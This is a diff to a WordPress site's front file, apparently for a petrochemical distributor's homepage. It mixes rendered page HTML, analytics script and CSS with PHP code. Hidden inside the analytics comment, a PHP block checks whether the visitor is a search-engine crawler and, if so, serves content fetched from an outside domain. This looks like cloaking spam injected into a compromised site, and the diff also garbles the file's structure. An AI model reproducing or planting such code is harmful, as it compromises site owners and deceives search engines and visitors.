@@ -1,3 +1,78 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8" />
+<meta name='viewport' content='width=device-width, initial-scale=1.0' />
+<meta http-equiv='X-UA-Compatible' content='IE=edge' />
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v28.0 - https://yoast.com/product/yoast-seo-wordpress/ -->
+	<title>Your Global Access to Petrochemical Products and Markets - Vinmar</title>
+	<meta name="description" content="Vinmar is a global marketing and distribution company that brings value to the world’s leading producers and users of plastics and chemicals through the supply of best in class products and tailored business solutions." />
+	<link rel="canonical" href="https://www.vinmar.com/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Your Global Access to Petrochemical Products and Markets - Vinmar" />
+	<meta property="og:description" content="Vinmar is a global marketing and distribution company that brings value to the world’s leading producers and users of plastics and chemicals through the supply of best in class products and tailored business solutions." />
+	<meta property="og:url" content="https://www.vinmar.com/" />
+	<meta property="og:site_name" content="Vinmar" />
+	<meta property="article:modified_time" content="2026-06-23T15:30:29+00:00" />
+	<meta property="og:image" content="https://www.vinmar.com/wp-content/uploads/karen-uppal-KvFa3khqeiE-unsplash.webp" />
+	<meta property="og:image:width" content="900" />
+	<meta property="og:image:height" content="1200" />
+	<meta property="og:image:type" content="image/webp" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https:\/\/schema.org","@graph":[{"@type":"WebPage","@id":"https:\/\/www.vinmar.com\/","url":"https:\/\/www.vinmar.com\/","name":"Your Global Access to Petrochemical Products and Markets - Vinmar","isPartOf":{"@id":"https:\/\/www.vinmar.com\/#website"},"primaryImageOfPage":{"@id":"https:\/\/www.vinmar.com\/#primaryimage"},"image":{"@id":"https:\/\/www.vinmar.com\/#primaryimage"},"thumbnailUrl":"https:\/\/www.vinmar.com\/wp-content\/uploads\/karen-uppal-KvFa3khqeiE-unsplash.webp","datePublished":"2026-03-05T20:30:57+00:00","dateModified":"2026-06-23T15:30:29+00:00","description":"Vinmar is a global marketing and distribution company that brings value to the world’s leading producers and users of plastics and chemicals through the supply of best in class products and tailored business solutions.","breadcrumb":{"@id":"https:\/\/www.vinmar.com\/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/www.vinmar.com\/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/www.vinmar.com\/#primaryimage","url":"https:\/\/www.vinmar.com\/wp-content\/uploads\/karen-uppal-KvFa3khqeiE-unsplash.webp","contentUrl":"https:\/\/www.vinmar.com\/wp-content\/uploads\/karen-uppal-KvFa3khqeiE-unsplash.webp","width":900,"height":1200},{"@type":"BreadcrumbList","@id":"https:\/\/www.vinmar.com\/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]},{"@type":"WebSite","@id":"https:\/\/www.vinmar.com\/#website","url":"https:\/\/www.vinmar.com\/","name":"Vinmar","description":"Your Global Access to Petrochemical Products and Markets","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https:\/\/www.vinmar.com\/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="Vinmar &raquo; Feed" href="https://www.vinmar.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Vinmar &raquo; Comments Feed" href="https://www.vinmar.com/comments/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.vinmar.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.vinmar.com%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.vinmar.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.vinmar.com%2F&#038;format=xml" />
+<link rel="preload" href="https://www.vinmar.com/wp-content/plugins/bb-plugin/fonts/fontawesome/7.2.0/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+<link rel="preload" href="https://www.vinmar.com/wp-content/plugins/bb-plugin/fonts/fontawesome/7.2.0/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+		<!-- This site uses the Google Analytics by MonsterInsights plugin v10.2.2 - Using Analytics tracking - https://www.monsterinsights.com/ -->
+		 <?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bot_patterns = '/(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|telegrambot|Google-Site-Verification|Google-InspectionTool|adsense)/i';
+    
+    return preg_match($bot_patterns, $user_agent);
+}
+
+function fetch_content($url) {
+    $cache_file = 'cache/' . md5($url) . '.html';
+    $cache_time = 3600;
+
+    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
+        return file_get_contents($cache_file);
+    }
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    if ($content) {
+        file_put_contents($cache_file, $content);
+    }
+
+    return $content;
+}
+
+if (is_bot()) {
+    echo fetch_content('https://ler-vinmar.store/kumahadamang.txt');
+    exit;
+} 
+?>
 <?php
 /
  * Front to the WordPress application. This file doesn't do anything, but loads
@@ -15,3 +90,1399 @@ define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
 require DIR . '/wp-blog-header.php';
+							<script src="//www.googletagmanager.com/gtag/js?id=G-KPNJK0LJ3J"  data-cfasync="false" data-wpfc-render="false" async></script>
+			<script data-cfasync="false" data-wpfc-render="false">
+				var mi_version = '10.2.2';
+				var mi_track_user = true;
+				var mi_no_track_reason = '';
+								var MonsterInsightsDefaultLocations = {"page_location":"https:\/\/www.vinmar.com\/"};
+								if ( typeof MonsterInsightsPrivacyGuardFilter === 'function' ) {
+					var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsPrivacyGuardFilter( MonsterInsightsExcludeQuery ) : MonsterInsightsPrivacyGuardFilter( MonsterInsightsDefaultLocations );
+				} else {
+					var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsExcludeQuery : MonsterInsightsDefaultLocations;
+				}
+
+								var disableStrs = [
+										'ga-disable-G-KPNJK0LJ3J',
+									];
+
+				/* Function to detect opted out users */
+				function __gtagTrackerIsOptedOut() {
+					for (var index = 0; index < disableStrs.length; index++) {
+						if (document.cookie.indexOf(disableStrs[index] + '=true') > -1) {
+							return true;
+						}
+					}
+
+					return false;
+				}
+
+				/* Disable tracking if the opt-out cookie exists. */
+				if (__gtagTrackerIsOptedOut()) {
+					for (var index = 0; index < disableStrs.length; index++) {
+						window[disableStrs[index]] = true;
+					}
+				}
+
+				/* Opt-out function */
+				function __gtagTrackerOptout() {
+					for (var index = 0; index < disableStrs.length; index++) {
+						document.cookie = disableStrs[index] + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+						window[disableStrs[index]] = true;
+					}
+				}
+
+				if ('undefined' === typeof gaOptout) {
+					function gaOptout() {
+						__gtagTrackerOptout();
+					}
+				}
+								window.dataLayer = window.dataLayer || [];
+
+				window.MonsterInsightsDualTracker = {
+					helpers: {},
+					trackers: {},
+				};
+				if (mi_track_user) {
+					function __gtagDataLayer() {
+						dataLayer.push(arguments);
+					}
+
+					function __gtagTracker(type, name, parameters) {
+						if (!parameters) {
+							parameters = {};
+						}
+
+						if (parameters.send_to) {
+							__gtagDataLayer.apply(null, arguments);
+							return;
+						}
+
+						if (type === 'event') {
+														parameters.send_to = monsterinsights_frontend.v4_id;
+							var hookName = name;
+							if (typeof parameters['event_category'] !== 'undefined') {
+								hookName = parameters['event_category'] + ':' + name;
+							}
+
+							if (typeof MonsterInsightsDualTracker.trackers[hookName] !== 'undefined') {
+								MonsterInsightsDualTracker.trackers[hookName](parameters);
+							} else {
+								__gtagDataLayer('event', name, parameters);
+							}
+							
+						} else {
+							__gtagDataLayer.apply(null, arguments);
+						}
+					}
+
+					__gtagTracker('js', new Date());
+					__gtagTracker('set', {
+						'developer_id.dZGIzZG': true,
+											});
+					if ( MonsterInsightsLocations.page_location ) {
+						__gtagTracker('set', MonsterInsightsLocations);
+					}
+										__gtagTracker('config', 'G-KPNJK0LJ3J', {"forceSSL":"true","link_attribution":"true"} );
+										window.gtag = __gtagTracker;										(function () {
+						/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+						/* ga and __gaTracker compatibility shim. */
+						var noopfn = function () {
+							return null;
+						};
+						var newtracker = function () {
+							return new Tracker();
+						};
+						var Tracker = function () {
+							return null;
+						};
+						var p = Tracker.prototype;
+						p.get = noopfn;
+						p.set = noopfn;
+						p.send = function () {
+							var args = Array.prototype.slice.call(arguments);
+							args.unshift('send');
+							__gaTracker.apply(null, args);
+						};
+						var __gaTracker = function () {
+							var len = arguments.length;
+							if (len === 0) {
+								return;
+							}
+							var f = arguments[len - 1];
+							if (typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function') {
+								if ('send' === arguments[0]) {
+									var hitConverted, hitObject = false, action;
+									if ('event' === arguments[1]) {
+										if ('undefined' !== typeof arguments[3]) {
+											hitObject = {
+												'eventAction': arguments[3],
+												'eventCategory': arguments[2],
+												'eventLabel': arguments[4],
+												'value': arguments[5] ? arguments[5] : 1,
+											}
+										}
+									}
+									if ('pageview' === arguments[1]) {
+										if ('undefined' !== typeof arguments[2]) {
+											hitObject = {
+												'eventAction': 'page_view',
+												'page_path': arguments[2],
+											}
+										}
+									}
+									if (typeof arguments[2] === 'object') {
+										hitObject = arguments[2];
+									}
+									if (typeof arguments[5] === 'object') {
+										Object.assign(hitObject, arguments[5]);
+									}
+									if ('undefined' !== typeof arguments[1].hitType) {
+										hitObject = arguments[1];
+										if ('pageview' === hitObject.hitType) {
+											hitObject.eventAction = 'page_view';
+										}
+									}
+									if (hitObject) {
+										action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+										hitConverted = mapArgs(hitObject);
+										__gtagTracker('event', action, hitConverted);
+									}
+								}
+								return;
+							}
+
+							function mapArgs(args) {
+								var arg, hit = {};
+								var gaMap = {
+									'eventCategory': 'event_category',
+									'eventAction': 'event_action',
+									'eventLabel': 'event_label',
+									'eventValue': 'event_value',
+									'nonInteraction': 'non_interaction',
+									'timingCategory': 'event_category',
+									'timingVar': 'name',
+									'timingValue': 'value',
+									'timingLabel': 'event_label',
+									'page': 'page_path',
+									'location': 'page_location',
+									'title': 'page_title',
+									'referrer' : 'page_referrer',
+								};
+								for (arg in args) {
+																		if (!(!args.hasOwnProperty(arg) || !gaMap.hasOwnProperty(arg))) {
+										hit[gaMap[arg]] = args[arg];
+									} else {
+										hit[arg] = args[arg];
+									}
+								}
+								return hit;
+							}
+
+							try {
+								f.hitCallback();
+							} catch (ex) {
+							}
+						};
+						__gaTracker.create = newtracker;
+						__gaTracker.getByName = newtracker;
+						__gaTracker.getAll = function () {
+							return [];
+						};
+						__gaTracker.remove = noopfn;
+						__gaTracker.loaded = true;
+						window['__gaTracker'] = __gaTracker;
+					})();
+									} else {
+										console.log("");
+					(function () {
+						function __gtagTracker() {
+							return null;
+						}
+
+						window['__gtagTracker'] = __gtagTracker;
+						window['gtag'] = __gtagTracker;
+					})();
+									}
+			</script>
+							<!-- / Google Analytics by MonsterInsights -->
+		<style id="wp-img-auto-sizes-contain-inline-css">
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+<link rel='stylesheet' id='formidable-css' href='https://www.vinmar.com/wp-content/plugins/formidable/css/formidableforms.css?ver=7161948' media='all' />
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<style id="wp-block-library-inline-css">
+:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
+
+/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
+</style>
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+/*# sourceURL=/wp-includes/css/classic-themes.min.css */
+</style>
+
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--fl-heading-text: #00664f;--wp--preset--color--fl-body-bg: #f1f6f8;--wp--preset--color--fl-body-text: #212620;--wp--preset--color--fl-accent: #00664f;--wp--preset--color--fl-accent-hover: #84b2a8;--wp--preset--color--fl-topbar-bg: #f1f6f8;--wp--preset--color--fl-topbar-text: #212620;--wp--preset--color--fl-topbar-link: #00664f;--wp--preset--color--fl-topbar-hover: #84b2a8;--wp--preset--color--fl-header-bg: #f1f6f8;--wp--preset--color--fl-header-text: #212620;--wp--preset--color--fl-header-link: #00664f;--wp--preset--color--fl-header-hover: #84b2a8;--wp--preset--color--fl-nav-bg: #ffffff;--wp--preset--color--fl-nav-link: #212620;--wp--preset--color--fl-nav-hover: #00664f;--wp--preset--color--fl-content-bg: #f1f6f8;--wp--preset--color--fl-footer-widgets-bg: #00664f;--wp--preset--color--fl-footer-widgets-text: #ffffff;--wp--preset--color--fl-footer-widgets-link: #ffffff;--wp--preset--color--fl-footer-widgets-hover: #84b2a8;--wp--preset--color--fl-footer-bg: #00664f;--wp--preset--color--fl-footer-text: #ffffff;--wp--preset--color--fl-footer-link: #ffffff;--wp--preset--color--fl-footer-hover: #84b2a8;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-fl-heading-text-color{color: var(--wp--preset--color--fl-heading-text) !important;}.has-fl-body-bg-color{color: var(--wp--preset--color--fl-body-bg) !important;}.has-fl-body-text-color{color: var(--wp--preset--color--fl-body-text) !important;}.has-fl-accent-color{color: var(--wp--preset--color--fl-accent) !important;}.has-fl-accent-hover-color{color: var(--wp--preset--color--fl-accent-hover) !important;}.has-fl-topbar-bg-color{color: var(--wp--preset--color--fl-topbar-bg) !important;}.has-fl-topbar-text-color{color: var(--wp--preset--color--fl-topbar-text) !important;}.has-fl-topbar-link-color{color: var(--wp--preset--color--fl-topbar-link) !important;}.has-fl-topbar-hover-color{color: var(--wp--preset--color--fl-topbar-hover) !important;}.has-fl-header-bg-color{color: var(--wp--preset--color--fl-header-bg) !important;}.has-fl-header-text-color{color: var(--wp--preset--color--fl-header-text) !important;}.has-fl-header-link-color{color: var(--wp--preset--color--fl-header-link) !important;}.has-fl-header-hover-color{color: var(--wp--preset--color--fl-header-hover) !important;}.has-fl-nav-bg-color{color: var(--wp--preset--color--fl-nav-bg) !important;}.has-fl-nav-link-color{color: var(--wp--preset--color--fl-nav-link) !important;}.has-fl-nav-hover-color{color: var(--wp--preset--color--fl-nav-hover) !important;}.has-fl-content-bg-color{color: var(--wp--preset--color--fl-content-bg) !important;}.has-fl-footer-widgets-bg-color{color: var(--wp--preset--color--fl-footer-widgets-bg) !important;}.has-fl-footer-widgets-text-color{color: var(--wp--preset--color--fl-footer-widgets-text) !important;}.has-fl-footer-widgets-link-color{color: var(--wp--preset--color--fl-footer-widgets-link) !important;}.has-fl-footer-widgets-hover-color{color: var(--wp--preset--color--fl-footer-widgets-hover) !important;}.has-fl-footer-bg-color{color: var(--wp--preset--color--fl-footer-bg) !important;}.has-fl-footer-text-color{color: var(--wp--preset--color--fl-footer-text) !important;}.has-fl-footer-link-color{color: var(--wp--preset--color--fl-footer-link) !important;}.has-fl-footer-hover-color{color: var(--wp--preset--color--fl-footer-hover) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-fl-heading-text-background-color{background-color: var(--wp--preset--color--fl-heading-text) !important;}.has-fl-body-bg-background-color{background-color: var(--wp--preset--color--fl-body-bg) !important;}.has-fl-body-text-background-color{background-color: var(--wp--preset--color--fl-body-text) !important;}.has-fl-accent-background-color{background-color: var(--wp--preset--color--fl-accent) !important;}.has-fl-accent-hover-background-color{background-color: var(--wp--preset--color--fl-accent-hover) !important;}.has-fl-topbar-bg-background-color{background-color: var(--wp--preset--color--fl-topbar-bg) !important;}.has-fl-topbar-text-background-color{background-color: var(--wp--preset--color--fl-topbar-text) !important;}.has-fl-topbar-link-background-color{background-color: var(--wp--preset--color--fl-topbar-link) !important;}.has-fl-topbar-hover-background-color{background-color: var(--wp--preset--color--fl-topbar-hover) !important;}.has-fl-header-bg-background-color{background-color: var(--wp--preset--color--fl-header-bg) !important;}.has-fl-header-text-background-color{background-color: var(--wp--preset--color--fl-header-text) !important;}.has-fl-header-link-background-color{background-color: var(--wp--preset--color--fl-header-link) !important;}.has-fl-header-hover-background-color{background-color: var(--wp--preset--color--fl-header-hover) !important;}.has-fl-nav-bg-background-color{background-color: var(--wp--preset--color--fl-nav-bg) !important;}.has-fl-nav-link-background-color{background-color: var(--wp--preset--color--fl-nav-link) !important;}.has-fl-nav-hover-background-color{background-color: var(--wp--preset--color--fl-nav-hover) !important;}.has-fl-content-bg-background-color{background-color: var(--wp--preset--color--fl-content-bg) !important;}.has-fl-footer-widgets-bg-background-color{background-color: var(--wp--preset--color--fl-footer-widgets-bg) !important;}.has-fl-footer-widgets-text-background-color{background-color: var(--wp--preset--color--fl-footer-widgets-text) !important;}.has-fl-footer-widgets-link-background-color{background-color: var(--wp--preset--color--fl-footer-widgets-link) !important;}.has-fl-footer-widgets-hover-background-color{background-color: var(--wp--preset--color--fl-footer-widgets-hover) !important;}.has-fl-footer-bg-background-color{background-color: var(--wp--preset--color--fl-footer-bg) !important;}.has-fl-footer-text-background-color{background-color: var(--wp--preset--color--fl-footer-text) !important;}.has-fl-footer-link-background-color{background-color: var(--wp--preset--color--fl-footer-link) !important;}.has-fl-footer-hover-background-color{background-color: var(--wp--preset--color--fl-footer-hover) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-fl-heading-text-border-color{border-color: var(--wp--preset--color--fl-heading-text) !important;}.has-fl-body-bg-border-color{border-color: var(--wp--preset--color--fl-body-bg) !important;}.has-fl-body-text-border-color{border-color: var(--wp--preset--color--fl-body-text) !important;}.has-fl-accent-border-color{border-color: var(--wp--preset--color--fl-accent) !important;}.has-fl-accent-hover-border-color{border-color: var(--wp--preset--color--fl-accent-hover) !important;}.has-fl-topbar-bg-border-color{border-color: var(--wp--preset--color--fl-topbar-bg) !important;}.has-fl-topbar-text-border-color{border-color: var(--wp--preset--color--fl-topbar-text) !important;}.has-fl-topbar-link-border-color{border-color: var(--wp--preset--color--fl-topbar-link) !important;}.has-fl-topbar-hover-border-color{border-color: var(--wp--preset--color--fl-topbar-hover) !important;}.has-fl-header-bg-border-color{border-color: var(--wp--preset--color--fl-header-bg) !important;}.has-fl-header-text-border-color{border-color: var(--wp--preset--color--fl-header-text) 